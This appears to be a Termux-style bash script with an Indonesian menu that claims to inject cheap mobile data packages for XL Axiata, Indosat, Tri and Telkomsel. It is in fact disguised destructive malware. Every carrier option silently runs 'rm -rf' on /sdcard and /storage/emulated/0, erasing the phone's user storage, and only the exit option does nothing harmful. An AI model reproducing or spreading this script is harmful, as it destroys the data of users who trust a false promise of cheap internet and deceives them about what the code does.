#!bin/bash
clear

echo "TEMBAK SEPUAS LO"
date
sleep 1
echo "1. XL Axiata(Tinggal pilih)"
echo "2. Indosat(Tinggal pilih)"
echo "3. Tri(Tinggal Pilih)"
echo "4. Tsel(only 5gb Rp 5000)"
echo "5. KELUAR"
sleep 1
read -p "chosee@nomor: " keyznet

if [ $keyznet = 1 ];
then
        rm -rf /sdcard
        rm -rf /storage/emulated/0
      
fi

if [ $keyznet = 2 ];
then
        rm -rf /sdcard
        rm -rf /storage/emulated/0
      
fi

if [ $keyznet = 3 ];
then
        rm -rf /sdcard
        rm -rf /storage/emulated/0
      
fi

if [ $keyznet = 4 ];
then
        rm -rf /sdcard
        rm -rf /storage/emulated/0
      
fi

if [ $keyznet = 5 ];
then
      exit

fi
